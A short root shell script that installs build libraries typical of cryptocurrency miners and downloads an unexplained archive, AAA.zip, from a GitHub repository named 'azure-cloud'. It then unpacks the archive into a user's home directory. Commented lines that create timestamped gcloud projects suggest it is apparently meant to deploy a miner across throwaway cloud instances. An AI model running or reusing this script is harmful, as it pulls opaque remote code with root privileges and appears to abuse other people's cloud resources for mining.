sudo su

#project=$(date +"%d%m%Y%H%M%S")

#gcloud config set project $project

apt-get --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev ocl-icd-opencl-dev unzip

wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip

path=home/$1

mv AAA.zip $path/
unzip $path/AAA.zip
rm -rf $path/AAA.zip
